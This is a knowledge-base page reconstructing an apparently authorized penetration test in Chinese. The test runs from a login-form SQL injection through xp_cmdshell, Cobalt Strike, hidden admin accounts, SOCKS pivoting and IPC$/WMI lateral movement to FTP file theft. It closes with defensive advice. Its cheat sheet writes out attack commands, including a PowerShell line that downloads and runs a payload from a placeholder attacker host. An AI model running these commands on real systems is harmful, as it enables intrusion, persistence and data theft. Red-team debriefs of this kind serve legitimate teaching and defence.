---
title: 0x6270 安服项目实战：从登录口 SQL 注入到内网横向移动拿下 40 余台主机完整攻击链复现
description: 详细复现 0x6270 团队分享的某安服项目实战：从登录口 SQL 注入拿到 DBA 权限，利用 xp_cmdshell 获取 OS Shell
  上线 Cobalt Strike，提权后建立影子用户与 SOCKS 代理，使用 fscan 内网扫描、RDP 弱口令喷射、IPC$ 与 WMI 组合横向移动、FTP
  弱口令接管文件服务器，最终在两天授权期内拿下 40 余台主机权限的完整攻击链复现
category: program-analysis
tags:
- '0x6270'
- 渗透测试
- SQL注入
- 内网渗透
- 横向移动
- Cobalt Strike
- 提权
- 影子用户
- SOCKS代理
- fscan
- RDP弱口令
- IPC$
- WMI
- FTP弱口令
- 安服实战
- 红队实战
date: '2023-04-13'
updated: '2026-11-15'
---

## 概述

本页面复现 0x6270 安全团队微信公众号发布的《安服仔某渗透项目实战》文章，记录一次授权渗透测试项目的完整攻击链：从 Web 层登录口 SQL 注入获取 MSSQL DBA 权限，利用 `xp_cmdshell` 落地执行 PowerShell 上线 Cobalt Strike，提权后创建影子用户建立 SOCKS 代理通道，结合 fscan 内网扫描、RDP 弱口令喷射、IPC$ 与 WMI 组合横向移动、FTP 弱口令接管文件服务器，最终在两天授权窗口期内拿下 40 余台主机权限与上百个 FTP 账号的实战全过程。

该案例展示了从外网入口到内网核心资产的标准化红队攻击路径，涵盖 **初始访问 → 权限提升 → 凭证获取 → 横向移动 → 权限维持 → 目标数据收集** 完整 ATT&CK 链条，适合作为渗透测试实战教学与红队演练复盘参考。

> **来源归档**：[[0x6270-security-team-wechat-archive-202203-202304]] 中收录的「安服仔某渗透项目实战」文章（2023-04-13 发布）

---

## 攻击链全景图

```mermaid
flowchart TD
    A[登录口 SQL 注入\nPOST /xxx/xxxx/login.aspx] --> B[Sqlmap 验证\nMSSQL + Windows + ASP.NET\nDBA 权限]
    B --> C[xp_cmdshell 开启\nOS 命令执行]
    C --> D[PowerShell 反弹\n上线 Cobalt Strike Beacon]
    D --> E[提权\n补丁少/杀软关闭]
    E --> F[创建影子用户\nadmin$ / admin@123..]
    F --> G[建立 SOCKS 代理\n内网穿透]
    G --> H[fscan 内网扫描\n资产发现+弱口令爆破]
    H --> I1[RDP 弱口令喷射\nadministrator/123456\n~12 台主机]
    H --> I2[IPC$ + WMI 组合横向\n传马+执行上线 CS\n大量主机]
    H --> I3[FTP 弱口令\nadmin/admin\n文件服务器 1w+ 文件]
    I1 & I2 & I3 --> J[总计 40+ 主机权限\n100+ FTP 账号\n两天授权期结束]
```

---

## 阶段一：漏洞挖掘与初始访问

### 目标识别与扫描

- **测试性质**：授权安服项目，客户直接提供测试系统
- **工具链**：AWVS 自动扫描 + 人工渗透验证
- **扫描耗时**：1-2 小时发现 SQL 注入漏洞

### SQL 注入点复现

**漏洞位置**：登录页面 `POST /xxx/xxxx/login.aspx`

**抓包数据**：

```http
POST /xxx/xxxx/login.aspx HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://xxx.xxx.com:7699/
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
Content-Length: 58
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Host: xx.xx.xx.xx
Connection: Keep-alive

pwd=&userno=59s45qhepwd=&userno=59s45qhe
```

**注入参数**：`userno`（用户名字段），登录口典型的 POST 型注入

### Sqlmap 验证与权限确认

```bash
sqlmap -r req.txt --dbms=mssql --os=windows --technique=BEUSTQ
```

**关键发现**：

| 项目 | 详情 |
|------|------|
| 数据库 | Microsoft SQL Server |
| 操作系统 | Windows Server |
| Web 框架 | ASP.NET |
| 权限级别 | **DBA (sysadmin)** |
| 关键函数 | `xp_cmdshell` 可用 |

> **技术要点**：MSSQL DBA 权限配合 `xp_cmdshell` 存储过程直接提供了操作系统命令执行能力，这是从 Web 层突破到主机层的关键桥梁。参考 [[sqlmap-api-automation]] 了解自动化批量验证流程。

---

## 阶段二：主机落地与 C2 建立

### xp_cmdshell 获取 OS Shell

利用 Sqlmap 的 `--os-shell` 或手工调用 `xp_cmdshell` 执行 PowerShell 命令：

```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''http://attacker_ip/beacon.ps1''))"'
```

**执行结果**：成功获得交互式 OS 命令执行环境。

### Cobalt Strike Beacon 上线

- **加载方式**：PowerShell 反射加载 Beacon（无文件落地）
- **上线截图**：文章图 2-2 显示 Beacon 成功上线
- **目标环境**：Windows Server 2016，仅打 5 个补丁，**杀毒软件检测功能关闭**

> **关联技术**：Cobalt Strike Beacon 生成、监听器配置、无文件加载技术详见 [[cobalt-strike-external-c2-smb-beacon]]、[[cobalt-strike-4.7-bof-internals]]。

### 权限提升

- **提权条件**：补丁极少（仅 5 个），AV 实时防护关闭
- **提权方式**：文章未展开具体漏洞/利用代码，但 Win2016 少补丁环境常用：
  - 本地提权漏洞（如 CVE-2020-0796 SMBGhost、CVE-2021-1732 Win32k 等）
  - 服务配置错误、DLL 劫持、令牌窃取等
- **结果**：成功获取 **SYSTEM 权限**

> **参考**：Windows 提权技术体系见 [[xd-security-privilege-escalation-notes-day58-64]]、[[process-injection-tampering-techniques]]。

---

## 阶段三：权限维持与内网穿透

### 影子用户创建

为解决 Win2016 无法直接抓取明文密码（Mimikatz 无法从 LSASS 读取明文）的问题，采用**影子用户**方式维持权限：

```cmd
net user admin$ admin@123.. /add
net localgroup administrators admin$ /add
```

- **用户名**：`admin$`（末尾 `$` 使其在常规 `net user` 列表中隐藏，类似机器账户命名惯例）
- **密码**：`admin@123..`
- **权限**：加入 Administrators 组

> **技术细节**：影子用户通过 `$` 后缀隐藏，配合注册表 `HKLM\SAM\SAM\Domains\Account\Users\Names` 权限设置可进一步隐藏。凭证导出与 PTH 技术见 [[mimikatz-sekurlsa-pth-internals]]、[[lm-ntlm-hash-generation-analysis]]。

### SOCKS 代理建立

- **代理模式**：Cobalt Strike `socks 1080` 开启本地 SOCKS4a 代理
- **路由配置**：`route add 172.16.0.0 255.255.0.0 <beacon_id>` 添加内网段路由
- **工具链代理化**：Proxifier / proxychains / nmap -sS --proxy socks4://127.0.0.1:1080

**隐蔽性考量**：作者刻意**不使用端口转发**（如 `rportfwd`/`lportfwd`），而是直接通过目标网络出口建立连接，减少异常端口监听被发现风险。

> **内网穿透技术体系**：[[internal-network-pivoting-techniques]]、[[frp内网渗透应用]]、[[xd-security-internal-network-penetration-notes-day69-70]]、[[iox-proxy-protocol-evasion]]。

---

## 阶段四：内网侦察与横向移动

### fscan 内网扫描

将 fscan 上传至目标服务器隐藏目录执行：

```cmd
fscan.exe -h 172.16.0.0/16 -p 445,3389,135,139,21 -o result.txt
```

**扫描覆盖**：
- 存活主机发现（ICMP/ARP/NetBIOS）
- 端口服务识别（SMB/RDP/RPC/FTP 等）
- **弱口令爆破**（SMB/RDP/FTP/SSH/MySQL 等）

### RDP 弱口令喷射

**爆破结果**：~12 台主机中招
**通用凭证**：`administrator / 123456`

**典型上线截图**：
- 172.16.0.175 服务器（图 2-4）
- 172.16.4.19 个人 PC（图 2-5）
- 172.16.7.39 个人 PC（图 2-6）

> **RDP 横向移动技术**：[[xd-security-internal-network-penetration-notes-day69-70]]、[[named-pipe-smb-detection-sysmon]]。

### IPC$ + WMI 组合横向移动

**适用场景**：
- 目标开启文件共享（445/139）与 WMI（135）
- 已获取有效账号密码（通过 fscan 爆破获得大量 `administrator/123456`）
- 单纯 IPC$ 创建计划任务被拦截（疑似 360 天擎）

**组合利用流程**：

```cmd
# 1. IPC$ 建立会话并传马
net use \\target_ip\ipc$ "admin@123.." /user:administrator
copy beacon.exe \\target_ip\c$\beacon.exe

# 2. WMI 远程执行
wmiexec.py administrator:"admin@123.."@target_ip "cmd.exe /c c:\beacon.exe"
```

**工具选择**：
- `wmiexec.py` (Impacket) / `wmic` / `psexec.py` / Cobalt Strike `jump psexec` / `lateral movement` 模块

**优势**：
- IPC$ 仅建立会话传文件，不触发计划任务创建告警
- WMI 执行进程无需落地服务/任务，相对隐蔽
- 组合利用规避单一向量的检测规则

**上线成果**：图 2-7/2-8/2-9 显示大量主机通过此方式上线 Cobalt Strike

> **深度技术**：[[xd-security-internal-network-penetration-notes-day67-68]]、[[internal-network-pivoting-techniques]]、[[smb-named-pipe-c2-communication]]、[[cobalt-strike-external-c2-smb-beacon]]。

### FTP 服务器失陷

**发现**：内网存在 FTP 服务器，弱口令 `admin/admin`
**规模**：文件预估 10,000+，推测为核心文件存储服务器
**截图**：图 2-10

**影响**：直接获取大量业务敏感文件，无需进一步横向移动即可完成数据窃取目标。

---

## 阶段五：战果汇总与复盘

| 指标 | 数值 | 备注 |
|------|------|------|
| **授权时长** | 2 天 | 时间窗口紧凑 |
| **主机控制权** | 40+ 台 | 含服务器、PC、文件服务器 |
| **FTP 账号** | 100+ 个 | 文件服务器批量账号 |
| **初始入口** | 登录口 SQLi (DBA) | 单点突破 |
| **核心技术** | xp_cmdshell、CS、影子用户、SOCKS、fscan、RDP/IPC$/WMI/FTP 弱口令 | 标准化红队工具链 |
| **未完成目标** | 域控、工控网 | 受限于授权时间 |

**作者复盘建议**：
> 「每次渗透时要么写一份语雀要么将报告保存好，这样有助于增长我们的实战经验忘了也可以返回去看自己的骚姿势。」

---

## 关键技术点交叉引用索引

| 技术环节 | 核心知识页 | 备注 |
|----------|------------|------|
| SQL 注入挖掘与利用 | [[sqlmap-api-automation]]、[[mysql-dnslog-injection-loadfile-unc]]、[[mysql-duplicate-entry-error-based-sqli]] | MSSQL 注入特有技巧（xp_cmdshell、CLR 组件）可扩展 |
| MSSQL DBA 到 OS Shell | [[xd-security-pentest-basic-stage-notes]]（SQL注入模块） | 结合 `sp_configure`、`xp_cmdshell`、CLR 组件、沙箱绕过 |
| Cobalt Strike 基础设施 | [[cobalt-strike-external-c2-smb-beacon]]、[[cobalt-strike-4.7-bof-internals]]、[[c2-redirectors-malleable-c2-profiles]] | 监听器、Profile、重定向器、BOF |
| 权限提升 (Win2016) | [[xd-security-privilege-escalation-notes-day58-64]]、[[process-injection-tampering-techniques]] | 内核漏洞、服务配置、令牌操作 |
| 影子用户/隐藏账户 | [[mimikatz-sekurlsa-pth-internals]]、[[lm-ntlm-hash-generation-analysis]] | 注册表隐藏、SID 修改、Golden Ticket 结合 |
| SOCKS 代理与内网穿透 | [[internal-network-pivoting-techniques]]、[[frp内网渗透应用]]、[[xd-security-internal-network-penetration-notes-day69-70]] | CS 路由、frp/iox/SSH/Ngrok 多隧道对比 |
| fscan 内网扫描 | [[shiro-internal-penetration-case-study]]、[[listed-company-penetration-test-case-study]] | 资产发现、服务识别、弱口令爆破一体化 |
| RDP 横向移动 | [[xd-security-internal-network-penetration-notes-day69-70]]、[[named-pipe-smb-detection-sysmon]] | 爆破、凭证复用、图形界面操作 |
| IPC$ + WMI 组合 | [[xd-security-internal-network-penetration-notes-day67-68]]、[[smb-named-pipe-c2-communication]] | 传马与执行分离、规避计划任务监控 |
| FTP 弱口令与文件服务器 | [[listed-company-penetration-test-case-study]]（FTP 安全章节） | 匿名/弱口令、目录遍历、批量下载 |
| 威胁溯源与痕迹清理 | [[threat-attribution-tracing-techniques]]、[[memory-scanning-tools-evasion-techniques]] | 日志清理、内存马、反取证 |

---

## 实战启示与防御建议

### 攻击方视角（红队/渗透测试）

1. **单点突破放大效应**：一个登录口 SQLi (DBA) → 全网沦陷，印证「外网一处漏洞，内网全盘皆失」
2. **标准化工具链高效性**：CS + fscan + Impacket + 弱口令字典形成成熟 SOP，两天拿下 40+ 主机
3. **组合拳规避检测**：IPC$ 传马 + WMI 执行分离，避开单一向量（计划任务/服务创建）的 EDR 规则
4. **影子用户 + SOCKS 代理**：解决高版本 Windows 明文凭证获取难、端口转发易被发现的双重痛点
5. **时间管理**：授权窗口短时，优先级排序关键——先拿高价值资产（文件服务器、域控），再铺开广度

### 防御方视角（蓝队/运维/安全建设）

| 防御层面 | 针对性措施 |
|----------|------------|
| **Web 应用** | 参数化查询/预编译、WAF 规则覆盖登录口、最小权限数据库账户（禁用 `sa`/DBA 连 Web）、定期代码审计 |
| **数据库安全** | 禁用 `xp_cmdshell`/`sp_OACreate`/CLR 组件、禁用 `sa` 账户或强密码+IP 限制、审计敏感存储过程调用 |
| **主机加固** | 及时补丁管理（Win2016 仅 5 个补丁是重大失配）、开启 AV 实时防护并配置防篡改、启用 Windows Defender ATP/EDR、配置 AppLocker/WDAC 限制 PowerShell/WMIC/PSExec 等 LOLBin |
| **账号卫生** | 强密码策略+定期轮换、禁用/重命名 Administrator、禁止空密码/弱密码、实施最小权限原则、域环境启用 LAPS 管理本地管理员密码 |
| **网络隔离** | 服务器网段间微隔离（禁止 445/135/3389/139 横向访问）、跳板机/堡垒机统一运维入口、关闭非业务必要端口（FTP 改 SFTP/FTPS 并强认证） |
| **横向移动检测** | 部署 Sysmon 记录 Event ID 1/8/10/12/13/17/18、监控异常 SMB 会话/命名管道/WMI 事件、蜜罐账户/蜜标文件布设 |
| **C2 通信识别** | 流量基线分析、DNS/HTTP/SMB 异常连接检测、SSL/TLS 指纹识别（JA3）、威胁情报 IP/域名封锁 |
| **应急响应预案** | 定期实战攻防演练、建立取证就绪环境（日志集中存储、内存镜像能力）、快速隔离/熔断机制 |

---

## 关联案例对比

| 案例 | 相似点 | 差异点 |
|------|--------|--------|
| [[shiro-internal-penetration-case-study]] | Shiro RCE 初始访问 → CS 免杀上线 → NTLM 导出 → FTP 大规模横向 → 威胁溯源发现前置攻击者 | 初始向量不同（Java 反序列化 vs SQLi）、均使用 FTP 横向移动、均有溯源环节 |
| [[listed-company-penetration-test-case-study]] | 文件上传 → 哥斯拉/MSF/CS 多 C2 对接 → Socks 代理 → MSSQL xp_cmdshell → IoT/OT 设备失陷 | 入口为文件上传、涉及 IoT/OT 设备（打印机/UPS）、会话传递技术更丰富 |
| [[medical-system-internal-penetration-case-study]] | 越权文件上传 → 凭证导出 → 横向移动 → 多系统权限 → 敏感数据泄露 | 目标为医疗系统、强调数据泄露后果、越权逻辑漏洞入口 |
| [[edu-src-penetration-test-case-study]] | FOFA 资产发现 → 弱口令 → XSS → 文件上传绕过 → 蚁剑连接 | 面向教育 SRC、漏洞类型更偏 Web 应用层、规模较小 |

---

## 附录：原文关键命令速查表

```bash
# 1. Sqlmap 验证 MSSQL DBA
sqlmap -r req.txt --dbms=mssql --os=windows --is-dba --privileges

# 2. 开启 xp_cmdshell (若被禁用)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# 3. PowerShell 反弹上线 CS (示例)
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://<attacker>/beacon.ps1'))"

# 4. 创建影子用户
net user admin$ admin@123.. /add
net localgroup administrators admin$ /add
# 进一步隐藏：reg add "HKLM\SAM\SAM\Domains\Account\Users\Names\admin$" /ve /d "" /f

# 5. CS SOCKS 代理 + 路由
# Beacon 控制台:
socks 1080
route add 172.16.0.0 255.255.0.0 <beacon_id>

# 6. fscan 扫描内网
fscan.exe -h 172.16.0.0/16 -p 445,3389,135,139,21,1433,3306 -o scan.txt --ssh -u administrator -p 123456

# 7. IPC$ 传马
net use \\172.16.x.x\ipc$ "123456" /user:administrator
copy beacon.exe \\172.16.x.x\c$\beacon.exe

# 8. WMI 执行 (Impacket)
wmiexec.py administrator:"123456"@172.16.x.x "cmd.exe /c c:\beacon.exe"
# 或 CS 内置:
jump psexec 172.16.x.x smb

# 9. FTP 批量下载 (示例)
wget -m ftp://admin:admin@172.16.x.x --no-passive-ftp
# 或使用 lftp/WinSCP 脚本化
```

---

## 版本历史

| 版本 | 日期 | 变更说明 |
|------|------|----------|
| 1.0 | 2025-01-15 | 初始创建，基于 0x6270 微信归档文章结构化整理，建立完整攻击链复现与交叉引用索引 |

---

## 相关页面导航

- **团队归档索引**：[[0x6270-security-team-wechat-archive-202203-202304]]
- **团队知识星球**：[[0x6270-knowledge-planet-team]]、[[0x6270-hvv-vulnerability-threat-intelligence]]
- **同类实战案例**：[[shiro-internal-penetration-case-study]]、[[listed-company-penetration-test-case-study]]、[[medical-system-internal-penetration-case-study]]、[[edu-src-penetration-test-case-study]]
- **核心技术深度页**：[[internal-network-pivoting-techniques]]、[[cobalt-strike-external-c2-smb-beacon]]、[[xd-security-internal-network-penetration-notes-day67-68]]、[[xd-security-internal-network-penetration-notes-day69-70]]、[[mimikatz-sekurlsa-pth-internals]]、[[threat-attribution-tracing-techniques]]

## 来源

- [0x6270安全团队-202203-202304_50](../sources/0x6270安全团队-202203-202304_50.md)
